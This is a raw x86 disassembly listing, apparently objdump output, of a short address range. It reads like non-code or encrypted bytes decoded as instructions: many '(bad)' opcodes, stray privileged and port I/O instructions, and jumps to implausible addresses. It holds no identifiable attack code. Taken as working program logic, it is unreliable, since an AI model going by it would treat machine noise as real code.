  405958:	adc    eax,0xe1b887ad
  40595d:	mov    eax,0x6d06f68a
  405962:	pop    eax
  405963:	xor    al,BYTE PTR [esi+0x71cfccbe]
  405969:	and    BYTE PTR [edi+esi*4-0x70],bl
  40596d:	outs   dx,DWORD PTR ds:[esi]
  40596e:	or     DWORD PTR [esi-0x67],esp
  405971:	xchg   edi,eax
  405972:	lods   al,BYTE PTR ds:[esi]
  405973:	jl     0x4059a4
  405975:	add    DWORD PTR [ecx+0x3964c5b4],esi
  40597b:	adc    eax,0xee5d15b9
  405980:	popa   
  405981:	jmp    0x40590c
  405983:	fsubr  DWORD PTR [ebp-0x79d43c2]
  405989:	xor    eax,0xe6659267
  40598e:	fidivr WORD PTR [ebx+0x3d8a1aed]
  405994:	(bad)  
  405995:	fisttp WORD PTR [edx+0x322adda9]
  40599b:	mov    dh,0x87
  40599d:	mov    esp,0xa14dad0f
  4059a2:	(bad)  
  4059a3:	fdiv   QWORD PTR [eax-0x35]
  4059a6:	fst    DWORD PTR [edi]
  4059a8:	lods   al,BYTE PTR ds:[esi]
  4059a9:	std    
  4059aa:	popf   
  4059ab:	adc    DWORD PTR [edx],esp
  4059ad:	js     0x405931
  4059af:	add    eax,0xe417d9ac
  4059b4:	ss loop 0x4059bc
  4059b7:	aad    0x9e
  4059b9:	xor    ch,BYTE PTR [ebx+0x28]
  4059bc:	or     ah,ah
  4059be:	ret    
  4059bf:	add    DWORD PTR [esi+eax*1],edx
  4059c2:	nop
  4059c3:	or     edi,eax
  4059c5:	pop    ds
  4059c6:	out    0xe0,eax
  4059c8:	pop    ds
  4059c9:	xor    DWORD PTR [eax+0x29],0x2
  4059cd:	or     ebx,esp
  4059cf:	popa   
  4059d0:	out    0x42,eax
  4059d2:	sbb    esi,edx
  4059d4:	add    eax,DWORD PTR [edx+0x4fb5e3b7]
  4059da:	xor    dl,bl
  4059dc:	enter  0x50d9,0x50
  4059e0:	leave  
  4059e1:	xchg   ebx,eax
  4059e2:	aas    
  4059e3:	retf   0x6b72
  4059e6:	mov    esp,0x902d2127
  4059eb:	push   esp
  4059ec:	and    al,0xe3
  4059ee:	enter  0xcabd,0xca
  4059f2:	call   FWORD PTR [ebx-0x1189d27d]
  4059f8:	in     eax,dx
  4059f9:	push   ebp
  4059fa:	adc    bh,BYTE PTR [ecx+0x34]
  4059fd:	imul   ecx,eax,0xffffff8c
  405a00:	and    dl,BYTE PTR [ebx-0x3ef0ad4a]
  405a06:	mov    WORD PTR [esi+0x62],es
  405a09:	xchg   ebx,eax
  405a0a:	adc    eax,0xc6b6eeaa
  405a0f:	adc    ebx,DWORD PTR [ebx]
  405a11:	mov    ah,BYTE PTR [edx+0x5f]
  405a14:	sbb    ah,BYTE PTR [edi]
  405a16:	imul   esi,DWORD PTR [esi-0x6b6dfdcf],0x9c2ede1f
  405a20:	pop    ss
  405a21:	xchg   ebp,eax
  405a22:	daa    
  405a23:	jns    0x4059df
  405a25:	retf   
  405a26:	int3   
  405a27:	mov    ch,0xc8
  405a29:	shl    esp,0xe0
  405a2c:	xchg   ebx,eax
  405a2d:	push   eax
  405a2e:	repz test BYTE PTR [edx-0x16],cl
  405a32:	push   es
  405a33:	jmp    0x249c9103
  405a38:	rcl    BYTE PTR [edx],0xad
  405a3b:	mov    esp,0x3d26ad54
  405a40:	inc    ebp
  405a41:	push   ss
  405a42:	cmc    
  405a43:	shl    ch,0xd9
  405a46:	inc    ecx
  405a47:	inc    ebx
  405a48:	push   ebp
  405a49:	mov    edx,eax
  405a4b:	shl    DWORD PTR [edi+ecx*8-0x44],0x2f
  405a50:	sti    
  405a51:	push   cs
  405a52:	jno    0x405a6f
  405a54:	mov    eax,0xaa6a704f
  405a59:	mov    ebx,0x5e9a8fd4
  405a5e:	push   0x60db2bf7
  405a63:	test   BYTE PTR ds:0xe01bcf4d,cl
  405a69:	adc    dl,BYTE PTR [edi+0x3b]
  405a6c:	cmp    eax,0x4457919f
  405a71:	xor    edx,DWORD PTR [ebx+0x39e47e8]
  405a77:	clts   
  405a79:	loop   0x405ac5
  405a7b:	xchg   sp,ax
  405a7d:	push   0xce59fc11
  405a82:	cmp    al,0xe4
  405a84:	adc    al,0xd
  405a86:	retf   0x8ded
  405a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a8a:	clc    
  405a8b:	or     ebx,DWORD PTR [ebx-0x61]
  405a8e:	lea    esi,[edx]
  405a90:	aaa    
  405a91:	and    bh,BYTE PTR [edi-0x4ba9ade6]
  405a97:	adc    BYTE PTR [eax],0x84
  405a9a:	xchg   esi,eax
  405a9b:	ret    0x4d37
  405a9e:	pushf  
  405a9f:	pop    esp
  405aa0:	out    0xa8,al
  405aa2:	sub    esi,edi
  405aa4:	sub    cl,ch
  405aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa7:	fstp   DWORD PTR [esi+0x53]
  405aaa:	mov    esp,0x960584f3
  405aaf:	cmp    DWORD PTR [eax+0x54],0xffffffb7
  405ab3:	xor    BYTE PTR [edx-0x5d1e6a83],bl
  405ab9:	jmp    0xdc4a90af
  405abe:	(bad)  
  405ac0:	jne    0x405b1b
  405ac2:	stos   DWORD PTR es:[edi],eax
  405ac3:	leave  
  405ac4:	jg     0x405b16
  405ac6:	lock push es
  405ac8:	xor    al,cl
  405aca:	je     0x405abf
  405acc:	retf   
  405acd:	dec    edi
  405ace:	mov    ds:0x6a284ee9,al
  405ad3:	std    
  405ad4:	and    cl,al
  405ad6:	int    0xf6
  405ad8:	imul   BYTE PTR [esi+0x70]
  405adb:	sub    ebp,esi
  405add:	xchg   esp,eax
  405ade:	dec    esp
  405adf:	dec    ebx
  405ae0:	and    eax,0x1a22546
  405ae5:	cmp    BYTE PTR ds:[ebp+0x4d63e1dc],dh
  405aec:	outs   dx,DWORD PTR ds:[esi]
  405aed:	xchg   ebx,eax
  405aee:	add    esp,edx
  405af0:	push   edi
  405af1:	adc    BYTE PTR [edx],dl
  405af3:	jns    0x405b38
  405af5:	jnp    0x405afc
  405af7:	cmp    eax,0xc0b75497
  405afc:	jae    0x405af7
  405afe:	hlt    
  405aff:	jnp    0x405ad4
  405b01:	dec    ecx
  405b02:	or     eax,0x8cbb4721
  405b07:	sub    al,0xb6
  405b09:	sub    eax,0xf2825895
  405b0e:	jge    0x405adc
  405b10:	ret    
  405b11:	jge    0x405b91
  405b13:	rcl    BYTE PTR [ebp-0x6f8af7b0],1
  405b19:	xchg   esp,eax
  405b1a:	push   eax
  405b1b:	jne    0x405b98
  405b1d:	les    ecx,FWORD PTR [esi*2-0x2b055c43]
  405b24:	or     dh,BYTE PTR [esi-0xce68450]
  405b2a:	inc    ebp
  405b2b:	mul    BYTE PTR [edx+esi*4+0x574ed720]
  405b32:	or     DWORD PTR ss:[ebx-0x16],0xffffffc5
  405b37:	in     al,0xcf
  405b39:	mov    BYTE PTR [edi],ah
  405b3b:	int3   
  405b3c:	cdq    
  405b3d:	and    al,0x2c
  405b3f:	(bad)
  405b42:	push   eax
  405b43:	dec    esi
  405b44:	xchg   esp,eax
  405b45:	cmp    BYTE PTR [eax+0x7aadf07e],0xc2
  405b4c:	outs   dx,DWORD PTR ds:[esi]
  405b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b4e:	pop    esp
  405b4f:	xor    DWORD PTR [edx+0x75],0x69dc8868
  405b56:	mov    edi,0xc51e614d
  405b5b:	cs aam 0x36
  405b5e:	rol    DWORD PTR [esi+0x51d3ce52],0xa6
  405b65:	mov    ah,0xdc
  405b67:	mov    al,BYTE PTR [edx+0x2bd7ebd9]
  405b6d:	mov    esp,ebx
  405b6f:	mov    cl,0xb6
  405b71:	sub    BYTE PTR [esi],bh
  405b73:	dec    ebp
  405b74:	dec    edi
  405b75:	xor    DWORD PTR [ecx],esi
  405b77:	inc    ebx
  405b78:	rol    DWORD PTR [edi+0x18b288a0],1
  405b7e:	and    cl,ah
  405b80:	cmc    
  405b81:	add    al,0x78
  405b83:	xchg   edi,eax
  405b84:	int    0xd3
  405b86:	mov    esp,0xcc3fd6a0
  405b8b:	ret    
  405b8c:	out    dx,eax
  405b8d:	aad    0x45
  405b8f:	fsubr  st,st(4)
  405b91:	in     al,dx
  405b92:	sbb    edi,edx
  405b94:	fstp   QWORD PTR [ebp+0x46]
  405b97:	and    al,0x47
  405b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b9a:	dec    esi
  405b9b:	mov    ch,0x75
  405b9d:	jo     0x405be4
  405b9f:	inc    esp
  405ba0:	aam    0x55
  405ba2:	cdq    
  405ba3:	pop    esi
  405ba4:	cmp    DWORD PTR [ebx],eax
  405ba6:	dec    ebp
  405ba7:	int    0x83
  405ba9:	push   ebp
  405baa:	sub    ecx,DWORD PTR [ecx-0x7417257e]
  405bb0:	pop    ds
  405bb1:	inc    ebx
  405bb2:	xchg   DWORD PTR [ebp+0x68],esi
  405bb5:	mov    edx,DWORD PTR [esi+0x2086a8d6]
  405bbb:	sahf   
  405bbc:	mov    ebp,DWORD PTR [edx]
  405bbe:	jae    0x405b5d
  405bc0:	add    DWORD PTR [ebp+edx*8-0x6c5bd9d0],0x32
  405bc8:	mov    ch,0xd8
  405bca:	pextrw ebp,mm2,0x62
  405bce:	je     0x405c0b
  405bd0:	add    DWORD PTR [ebx+0x106a4318],eax
  405bd6:	(bad)  
  405bd7:	jae    0x405c56
  405bd9:	mov    ebx,DWORD PTR [esi]
  405bdb:	inc    ebp
  405bdc:	xor    al,0xfd
  405bde:	cli    
  405bdf:	aas    
  405be0:	icebp  
  405be1:	mov    ebp,DWORD PTR [ebp+0x76]
  405be4:	or     BYTE PTR [eax],ah
  405be6:	(bad)  
  405be7:	push   esp
  405be8:	pop    edx
  405be9:	and    BYTE PTR [ecx],dl
  405beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bec:	sbb    al,0xae
  405bee:	push   cs
  405bef:	inc    ecx
  405bf0:	enter  0x49e4,0x59
  405bf4:	push   eax
  405bf5:	cmpps  xmm6,XMMWORD PTR [ebp+0x52c1a179],0x79
  405bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bfe:	into   
  405bff:	jnp    0x405baa
  405c01:	mov    al,ds:0x9f0d1d49
  405c06:	inc    edi
  405c07:	mov    ebp,DWORD PTR [ecx+0x44]
  405c0a:	aaa    
  405c0b:	dec    eax
  405c0c:	outs   dx,BYTE PTR ds:[esi]
  405c0d:	into   
  405c0e:	(bad)  
  405c0f:	lds    esp,FWORD PTR [edx+0x663af6b3]
  405c15:	xor    BYTE PTR [ecx-0x5a970b4c],dh
  405c1b:	push   ebx
  405c1c:	dec    esi
  405c1d:	(bad)  
  405c1e:	mov    ds:0xcfc7b5c3,eax
  405c23:	(bad)  
  405c24:	inc    edx
  405c25:	iret   
  405c26:	pop    ecx
  405c27:	xchg   ebp,eax
  405c28:	rol    bl,1
  405c2a:	mov    ds,WORD PTR [ebx-0x73]
  405c2d:	iret   
  405c2e:	or     BYTE PTR [eax],ah
  405c30:	push   ebx
  405c31:	mov    DWORD PTR [ecx+0x7f38b2d6],ebp
  405c37:	mov    ebx,0x1a4935ed
  405c3c:	lahf   
  405c3d:	iret   
  405c3e:	mov    al,0x63
  405c40:	nop
  405c41:	aas    
  405c42:	cmc    
  405c43:	les    esp,FWORD PTR [ebx-0x3775c739]
  405c49:	out    0x17,al
  405c4b:	mov    DWORD PTR [ebx],ebp
  405c4d:	cmovb  edx,ebx
  405c50:	gs xor eax,0xbe89d551
  405c56:	ss aas 
  405c58:	dec    ebx
  405c59:	push   esi
  405c5a:	add    al,0xb1
  405c5c:	sub    BYTE PTR ds:0x9050c7c5,0xd4
  405c63:	adc    DWORD PTR [esi-0x76],esi
  405c66:	mov    edx,0x61115fea
  405c6b:	push   ecx
  405c6c:	mov    eax,0x9a9fe53d
  405c71:	mov    al,0x69
  405c73:	lds    edi,FWORD PTR [ebx]
  405c75:	xchg   ebx,eax
  405c76:	rol    DWORD PTR [ebx],0xa0
  405c79:	outs   dx,BYTE PTR ds:[esi]
  405c7a:	sbb    ebp,DWORD PTR [edx]
  405c7c:	addr16 inc edx
  405c7e:	ins    DWORD PTR es:[edi],dx
  405c7f:	jmp    0xf7e8:0xa0eb2d71
  405c86:	fidiv  WORD PTR [ecx]
  405c88:	add    DWORD PTR [ebx-0x4575a64d],esi
  405c8e:	adc    bl,ah
  405c90:	dec    esi
  405c91:	dec    ebx
  405c92:	fild   QWORD PTR [edi+0x49]
  405c95:	lahf   
  405c96:	mov    bh,0xfc
  405c98:	lods   al,BYTE PTR ds:[esi]
  405c99:	fdivr  st,st(7)
  405c9b:	sub    eax,0xc6e03d60
  405ca0:	mov    cl,0x8a
  405ca2:	pop    ds
  405ca3:	inc    edx
  405ca4:	and    BYTE PTR [ebx-0x5e],bh
  405ca7:	xor    ecx,DWORD PTR [edx-0x6895d911]
  405cad:	mov    ah,0x68
  405caf:	pop    esp
  405cb0:	aaa    
  405cb1:	mov    edx,0x4ddd22e2
  405cb6:	stc    
  405cb7:	mov    ds:0xf70691dd,al
  405cbc:	mov    ecx,0xec3ba9a7
  405cc1:	sub    DWORD PTR [ebp+edx*8+0x1e],edx
  405cc5:	sbb    BYTE PTR ds:0x468650c8,al
  405ccb:	sbb    eax,ebp
  405ccd:	sub    eax,DWORD PTR [esi]
  405ccf:	and    edi,DWORD PTR [edx]
  405cd1:	mov    dl,0xb5
  405cd3:	ins    DWORD PTR es:[edi],dx
  405cd4:	jge    0x405d55
  405cd6:	cdq    
  405cd7:	nop
  405cd8:	jge    0x405cf4
  405cda:	xor    eax,0x2b1d74b3
  405cdf:	fst    DWORD PTR [edx]
  405ce1:	xchg   DWORD PTR cs:[edi],edi
  405ce4:	or     BYTE PTR [esi-0x65],cl
  405ce7:	mov    esp,eax
  405ce9:	neg    dh
  405ceb:	xor    DWORD PTR [esi],esp
  405ced:	pop    es
  405cee:	in     al,dx
  405cef:	sbb    ch,BYTE PTR [eax+0x58]
  405cf2:	cmp    al,0xaf
  405cf4:	aad    0x3b
  405cf6:	aam    0x55
  405cf8:	pop    ds
  405cf9:	cmp    dl,BYTE PTR [eax+eax*2+0x55]
  405cfd:	add    BYTE PTR [ecx+0x59],bh
  405d00:	jecxz  0x405cb0
  405d02:	mov    ebp,DWORD PTR [edx+0x25]
  405d05:	jo     0x405cca
  405d07:	repnz cmp eax,0x61d6143f
  405d0d:	fs push edx
  405d0f:	out    0x23,eax
  405d11:	mov    edi,0xc27a7e62
  405d16:	xor    eax,0x96eb54b1
  405d1b:	dec    edx
  405d1c:	daa    
  405d1d:	in     eax,dx
  405d1e:	shl    BYTE PTR [edi-0x71377c0e],cl
  405d24:	mov    bh,0x80
  405d26:	pop    ebx
  405d27:	or     bl,BYTE PTR gs:[esp-0x66]
  405d2c:	xor    dl,BYTE PTR [edi-0x59b36001]
  405d32:	or     eax,0x318295a0
  405d37:	call   0x74841aed
  405d3c:	repz (bad) 
  405d3e:	inc    eax
  405d3f:	out    dx,eax
  405d40:	jne    0x405d39
  405d42:	mov    eax,0x5bd70f8e
  405d47:	fwait
  405d48:	adc    bh,dl
  405d4a:	imul   ecx,DWORD PTR [edi+ebx*2],0xffffff8a
  405d4e:	add    eax,edi
  405d50:	es out dx,al
  405d52:	inc    ebx
  405d53:	sti    
  405d54:	push   ebp
  405d55:	jl     0x405cf0
  405d57:	add    BYTE PTR [ebx],0xa7
  405d5a:	mov    WORD PTR [ebx-0x4c3d13d9],?
  405d60:	adc    ch,bh
  405d62:	jo     0x405d06
  405d64:	popf   
  405d65:	pop    esp
  405d66:	cli    
  405d67:	enter  0x5d61,0xc2
  405d6b:	aaa    
  405d6c:	mov    ds:0x17bec727,eax
  405d71:	(bad)  
  405d72:	ss jl  0x405da4
  405d75:	scas   al,BYTE PTR es:[edi]
  405d76:	adc    ebp,edx
  405d78:	push   ebp
  405d79:	stos   BYTE PTR es:[edi],al
  405d7a:	add    ch,bh
  405d7c:	mov    dh,0x9b
  405d7e:	(bad)  
  405d7f:	fmul   DWORD PTR [ecx]
  405d81:	add    bl,0x37
  405d84:	xor    eax,0x670351ad
  405d89:	xor    BYTE PTR [ebx],0x34
  405d8c:	cld    
  405d8d:	push   eax
  405d8e:	adc    ebx,DWORD PTR [ecx+0x4b]
  405d91:	cmp    cl,BYTE PTR [esi-0x12]
  405d94:	sbb    ch,BYTE PTR [esi+esi*1+0x8]
  405d98:	sub    eax,DWORD PTR [eax]
  405d9a:	movnti DWORD PTR [esp+eax*2],esp
  405d9e:	mov    edi,0x3e2a65e2
  405da3:	jb     0x405dd8
  405da5:	xor    al,0x99
  405da7:	das    
  405da8:	xchg   ecx,eax
  405da9:	adc    esp,ecx
  405dab:	lahf   
  405dac:	aas    
  405dad:	push   ebx
  405dae:	into   
  405daf:	sbb    al,0x6d
  405db1:	push   edi
  405db2:	push   0x5b
  405db4:	jl     0x405d62
  405db6:	js     0x405e24
  405db8:	lods   eax,DWORD PTR ds:[esi]
  405db9:	int3   
  405dba:	or     eax,0x783174bb
  405dbf:	shl    DWORD PTR [edx-0x43],1
  405dc2:	add    BYTE PTR [eax-0x4ac988e9],0x25
  405dc9:	mov    bl,0x4a
  405dcb:	sub    al,0xbf
  405dcd:	dec    edi
  405dce:	cmp    BYTE PTR [eax+0x1c5e7436],0x5b
  405dd5:	mov    ebp,0x13345ecc
  405dda:	or     ebx,DWORD PTR [esi-0x53]
  405ddd:	sar    DWORD PTR [eax+ebx*1-0xf],1
  405de1:	inc    esp
  405de2:	push   ebx
  405de3:	icebp  
  405de4:	sbb    DWORD PTR [esi-0x30362cfa],eax
  405dea:	fucompp 
  405dec:	cmp    dl,BYTE PTR [ebp+esi*8-0x2c]
  405df0:	arpl   cx,dx
  405df2:	leave  
  405df3:	lea    ebx,[edi-0x189e99d8]
  405df9:	js     0x405e4d
  405dfb:	mov    DWORD PTR [edx+0x46],ecx
  405dfe:	ins    BYTE PTR es:[edi],dx
  405dff:	daa    
  405e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e01:	jl     0x405d83
  405e03:	mov    edi,0x35fecb31
  405e08:	push   0x9b79e78b
  405e0d:	jns    0x405e2a
  405e0f:	mov    edi,0xf46a36c1
  405e14:	test   BYTE PTR [eax-0x20],ah
  405e17:	adc    ecx,esi
  405e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e1a:	out    dx,al
  405e1b:	and    al,bl
  405e1d:	stc    
  405e1e:	pusha  
  405e1f:	das    
  405e20:	sub    al,0x25
  405e22:	cmp    eax,0x8f8c641f
  405e27:	iret   
  405e28:	and    al,0x1f
  405e2a:	aas    
  405e2b:	gs push 0x4bfc8dec
  405e31:	pop    eax
  405e32:	jnp    0x405e02
  405e34:	cld    
  405e35:	gs iret 
  405e37:	nop
  405e38:	mov    esi,0xa7610c16
  405e3d:	sbb    al,0xa3
  405e3f:	lock xchg WORD PTR [ecx+0x47],si
  405e44:	push   esi
  405e45:	outs   dx,BYTE PTR ds:[esi]
  405e46:	gs jmp 0x36bfdc0b
  405e4c:	dec    ecx
  405e4d:	jle    0x405de7
  405e4f:	mov    ds:0x8b141d9f,eax
  405e54:	jl     0x405ddd
  405e56:	stc    
  405e57:	ins    BYTE PTR es:[edi],dx
  405e58:	cmc    
  405e59:	and    eax,0xe7b88e10
  405e5e:	inc    esi
  405e5f:	pop    ecx
  405e60:	jmp    0x33203283
  405e65:	mov    WORD PTR [ebp+0x56a7b25d],?
  405e6b:	lahf   
  405e6c:	mov    esi,ds
  405e6e:	push   ds
  405e6f:	push   ss
  405e70:	push   0xab1dcdfd
  405e75:	in     al,dx
  405e76:	rol    eax,1
  405e78:	add    edi,0xffffffc3
  405e7b:	xchg   esi,eax
  405e7c:	xchg   esp,eax
  405e7d:	fidivr WORD PTR [esi]
  405e7f:	scas   eax,DWORD PTR es:[edi]
  405e80:	pop    es
  405e81:	jb     0x405ea4
  405e83:	into   
  405e84:	test   DWORD PTR [ebp+edx*4+0x4c5888b1],edx
  405e8b:	mov    gs,edx
  405e8d:	minps  xmm0,XMMWORD PTR [ecx+0x3492c694]
  405e94:	rcl    BYTE PTR [eax-0x27ca4f68],0x2e
  405e9b:	push   0x6c
  405e9d:	or     eax,0x8954e56
  405ea2:	pop    edx
  405ea3:	add    BYTE PTR [ebx+0x73],bh
  405ea6:	gs jnp 0x405e41
  405ea9:	div    DWORD PTR [esi-0x27]
  405eac:	inc    eax
  405ead:	pusha  
  405eae:	xor    edx,0x2290a987
  405eb4:	xchg   ebx,eax
  405eb5:	xchg   ecx,eax
  405eb6:	out    0x57,eax
  405eb8:	sbb    edx,DWORD PTR [ecx+0x17]
  405ebb:	imul   esi,ebp,0xffffff85
  405ebe:	xor    dl,BYTE PTR [esi]
  405ec0:	jne    0x405ee0
  405ec2:	xchg   ebp,eax
  405ec3:	sbb    DWORD PTR [ecx+eax*8+0x34340f60],esi
  405eca:	mov    eax,0x45f5a7a1
  405ecf:	imul   ebx,DWORD PTR [esi],0x241cefd9
  405ed5:	loope  0x405f1a
  405ed7:	rcl    BYTE PTR ds:0x8e52b78b,1
  405edd:	pop    edx
  405ede:	cwde   
  405edf:	xor    ebx,ebp
  405ee1:	push   ds
  405ee2:	out    0xd6,al
  405ee4:	pusha  
  405ee5:	shr    BYTE PTR [edi+esi*4-0x2184dc03],cl
  405eec:	or     al,0x4a
  405eee:	push   0x93b5142a
  405ef3:	sbb    DWORD PTR [edi+eiz*4],ebp
  405ef6:	push   0xffffffd4
  405ef8:	adc    dh,BYTE PTR [esi-0x24]
  405efb:	jnp    0x405ebd
  405efd:	popa   
  405efe:	jb     0x405eae
  405f00:	sub    BYTE PTR [eax],cl
  405f02:	lods   eax,DWORD PTR ds:[esi]
  405f03:	out    dx,eax
  405f04:	test   BYTE PTR [edx-0x63975587],dh
  405f0a:	fist   WORD PTR [ebx+0x1fc1b1ce]
  405f10:	iret   
  405f11:	sbb    BYTE PTR [esi+0x6e],ch
  405f14:	xchg   esp,eax
  405f15:	in     al,dx
  405f16:	dec    ebx
  405f17:	xchg   ebp,eax
  405f18:	or     al,0xc9
  405f1a:	push   0xffffffd1
  405f1c:	sub    edx,ebp
  405f1e:	sbb    BYTE PTR [esi+0x6035b953],0x5e
  405f25:	mov    al,ds:0x1792163b
  405f2a:	std    
  405f2b:	xchg   esi,eax
  405f2c:	jno    0x405f8d
  405f2e:	sti    
  405f2f:	out    dx,eax
  405f30:	in     al,dx
  405f31:	out    0xcd,al
  405f33:	into   
  405f34:	popf   
  405f35:	xor    eax,0xfde8dc98
  405f3a:	push   esp
  405f3b:	ss adc eax,0x2c388264
  405f41:	mov    bl,0x8d
  405f43:	jl     0x405faf
  405f45:	xor    cl,dl
  405f47:	mov    esp,0x628b3d1a
  405f4c:	test   al,0xaf
  405f4e:	mov    cl,0xea
  405f50:	mov    ch,0xdc
  405f52:	ds add eax,0xafd2b8e0
  405f58:	add    ecx,DWORD PTR [eax+0x35]
  405f5b:	pushf  
  405f5c:	setno  BYTE PTR [edx-0x1b]
  405f60:	xchg   edx,eax
  405f61:	test   al,0x35
  405f63:	jne    0x405f39
  405f65:	call   0x3a97:0x6e4605ce
  405f6c:	addr16 jns 0x405f42
  405f6f:	or     edx,esp
  405f71:	neg    DWORD PTR [esi+0x1ab7438d]
  405f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f78:	mov    ecx,0xdfe0d4a9
  405f7d:	add    cl,dl
  405f7f:	sbb    eax,0x98e08baa
  405f84:	ss dec ebx
  405f86:	rcl    BYTE PTR ds:0xd377a57b,0xb0
  405f8d:	aad    0x0
  405f8f:	lods   eax,DWORD PTR ds:[esi]
  405f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f91:	retf   
  405f92:	ins    BYTE PTR es:[edi],dx
  405f93:	(bad)  
  405f94:	cdq    
  405f95:	sbb    esp,ebp
  405f97:	mov    dh,0x71
  405f99:	sbb    bh,BYTE PTR [eax]
  405f9b:	adc    BYTE PTR [esi],ch
  405f9d:	fmulp  st(6),st
  405f9f:	xor    BYTE PTR [eax+0x1e],ch
  405fa2:	das    
  405fa3:	cmc    
  405fa4:	or     eax,DWORD PTR [ebp+eax*4+0xa]
  405fa8:	dec    edx
  405fa9:	mov    DWORD PTR [ebx-0x11],esp
  405fac:	cmc    
  405fad:	sub    eax,0x259dada
  405fb2:	push   eax
  405fb3:	mov    al,0x97
  405fb5:	test   eax,0xf5595cfd
  405fba:	mov    ebp,0x4bda44e2
  405fbf:	outs   dx,BYTE PTR ds:[esi]
  405fc0:	std    
  405fc1:	gs dec ebp
  405fc3:	cmp    DWORD PTR [ecx],eax
  405fc5:	dec    ecx
  405fc6:	repz sbb al,0x7d
  405fc9:	lods   al,BYTE PTR ds:[esi]
  405fca:	jl     0x405ff3
  405fcc:	mov    ebp,0xa749fa06
  405fd1:	push   es
  405fd2:	push   edi
  405fd3:	add    eax,0x4522508e
  405fd8:	mov    gs,WORD PTR [edi+edx*1-0x4d]
  405fdc:	gs push ds
  405fde:	push   esp
  405fdf:	das    
  405fe0:	pop    ecx
  405fe1:	retf   0x441c
  405fe4:	jl     0x405f9e
  405fe6:	mov    al,0x73
  405fe8:	jo     0x40601f
  405fea:	std    
  405feb:	mov    al,0x22
  405fed:	sub    cl,BYTE PTR [esi-0x612fd07e]
  405ff3:	mov    DWORD PTR [ecx],ebp
  405ff5:	pop    DWORD PTR [edi]
  405ff7:	mov    edi,DWORD PTR [edx-0x707983d6]
  405ffd:	call   0xf08cbcf4
  406002:	fstp   QWORD PTR [edi-0x7ef68b23]
  406008:	test   eax,0x949e7da9
  40600d:	mov    BYTE PTR [esp+ebp*2+0x12522731],cl
  406014:	sar    DWORD PTR [eax],cl
  406016:	inc    esi
  406017:	push   edi
  406018:	jbe    0x405fcc
  40601a:	jmp    0x6f7e261d
  40601f:	push   esp
  406020:	pop    eax
  406021:	sub    bl,BYTE PTR [ebx-0x7dc9edea]
  406027:	and    bh,dh
  406029:	outs   dx,BYTE PTR ds:[esi]
  40602a:	jge    0x406009
  40602c:	mov    ebp,ecx
  40602e:	ja     0x4060a6
  406030:	mov    ecx,DWORD PTR [ecx+0x20e878c8]
  406036:	mov    ebp,ds
  406038:	cli    
  406039:	mov    bh,0x60
  40603b:	ret    
  40603c:	jg     0x405fdc
  40603e:	push   esi
  40603f:	popa   
  406040:	jmp    0x5279eafc
  406045:	or     edx,esi
  406047:	mov    ecx,0x8c708ed9
  40604c:	dec    edi
  40604d:	fcomp  DWORD PTR [edx+0x2a]
  406050:	push   ecx
  406051:	call   0x9872:0x2acf86d8
  406058:	fsubr  DWORD PTR [ecx]
  40605a:	lahf   
  40605b:	or     ebp,DWORD PTR [eax]
  40605d:	jp     0x40601c
  40605f:	cmp    BYTE PTR [ebp+0x5b6e79f9],dl
  406065:	xchg   DWORD PTR ds:0x4453cc50,edx
  40606b:	push   0x6d
  40606d:	cld    
  40606e:	sub    eax,0xc5b24620
  406073:	push   eax
  406074:	adc    BYTE PTR [esi+esi*8+0x19e48bf4],0x62
  40607c:	les    ebx,FWORD PTR [ebp+0x75c4c43b]
  406082:	repz popa 
  406084:	in     eax,0x16
  406086:	es ffreep st(0)
  406089:	lds    esi,FWORD PTR [ebx-0x5c169ed]
  40608f:	int3   
  406090:	popa   
  406091:	icebp  
  406092:	cmp    al,0xb8
  406094:	mov    bh,0xc2
  406096:	xchg   BYTE PTR [esi-0x3],cl
  406099:	or     BYTE PTR [edx],cl
  40609b:	mov    edx,?
  40609d:	push   0xffffffe0
  40609f:	mov    esp,0x21ff521d
  4060a4:	pop    ebx
  4060a5:	daa    
  4060a6:	dec    edx
  4060a7:	jno    0x4060eb
  4060a9:	mov    bh,0x58
  4060ab:	sti    
  4060ac:	pop    edi
  4060ad:	jle    0x4060dc
  4060af:	(bad)  
  4060b0:	jmp    0x4060d7
  4060b2:	test   esp,0x1269f8b7
  4060b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060b9:	ret    0x43dd
  4060bc:	out    0x38,ax
  4060bf:	jbe    0x406125
  4060c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060c2:	dec    eax
  4060c3:	out    0x1f,al
  4060c5:	cld    
  4060c6:	xchg   esp,eax
  4060c7:	popf   
  4060c8:	inc    ebx
  4060c9:	jmp    0x4060ef
  4060cb:	jnp    0x4060fd
  4060cd:	test   BYTE PTR [esi+0x79],bh
  4060d0:	jmp    0x32c9:0xb742c2aa
  4060d7:	push   edx
  4060d8:	pop    ecx
  4060d9:	mov    ds,WORD PTR [edi+0x1]
  4060dc:	jecxz  0x406085
  4060de:	xchg   ebx,eax
  4060df:	stos   BYTE PTR es:[edi],al
  4060e0:	inc    edx
  4060e1:	cmp    al,0xe5
  4060e3:	lahf   
  4060e4:	shr    DWORD PTR [edx],0x79
  4060e7:	sbb    esp,DWORD PTR ds:0x6a39fce0
  4060ed:	sbb    DWORD PTR [ebp+0x1c6987b9],0xdc85a24b
  4060f7:	sbb    BYTE PTR [ebx],dh
  4060f9:	jo     0x406116
  4060fb:	adc    ah,dl
  4060fd:	mov    ch,0x28
  4060ff:	popa   
  406100:	into   
  406101:	(bad)  
  406102:	sbb    ebp,ebp
  406104:	pop    ss
  406105:	imul   edi,DWORD PTR ds:0x259e8705,0x33d21085
  40610f:	mov    WORD PTR [edi],?
  406111:	mov    ds:0xfeebc807,eax
  406116:	ret    0xa255
  406119:	out    dx,eax
  40611a:	pop    ds
  40611b:	and    ecx,DWORD PTR [ebx-0x6d]
  40611e:	add    eax,0xc8347634
  406123:	stos   DWORD PTR es:[edi],eax
